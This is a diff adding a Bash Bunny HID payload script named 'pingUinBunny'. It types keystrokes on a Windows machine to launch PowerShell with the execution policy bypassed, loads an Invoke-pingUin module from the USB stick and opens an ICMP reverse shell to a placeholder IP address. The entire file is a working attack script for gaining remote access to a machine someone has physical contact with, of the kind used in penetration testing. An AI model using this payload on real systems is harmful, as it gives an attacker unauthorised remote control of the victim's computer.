@@ -1,0 +1,43 @@
+#!/bin/bash
+#
+# Title:         pingUinBunny
+# Description:   Get remote access using a icmp reverse shell.
+# Author:        0iphor13
+# Version:       1.0
+# Category:      Remote_Access
+# Attackmodes:   HID, Storage
+
+LED SETUP
+
+DELAY 500
+
+GET SWITCH_POSITION
+DUCKY_LANG de
+
+DELAY 500
+
+ATTACKMODE HID STORAGE
+
+#LED STAGE1 - DON'T EJECT - PAYLOAD RUNNING
+
+LED STAGE1
+
+DELAY 5000
+RUN WIN "powershell -Exec Bypass"
+DELAY 6000
+Q ENTER
+
+DELAY 10000
+Q STRING "Import-Module ((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\Invoke-pingUin.ps1')"
+DELAY 10000
+Q ENTER
+DELAY 10000
+Q STRING "Invoke-pingUin -IpAddress 0.0.0.0"
+DELAY 10000
+Q ENTER
+
+DELAY 5000
+
+ATTACKMODE HID
+
+LED FINISH
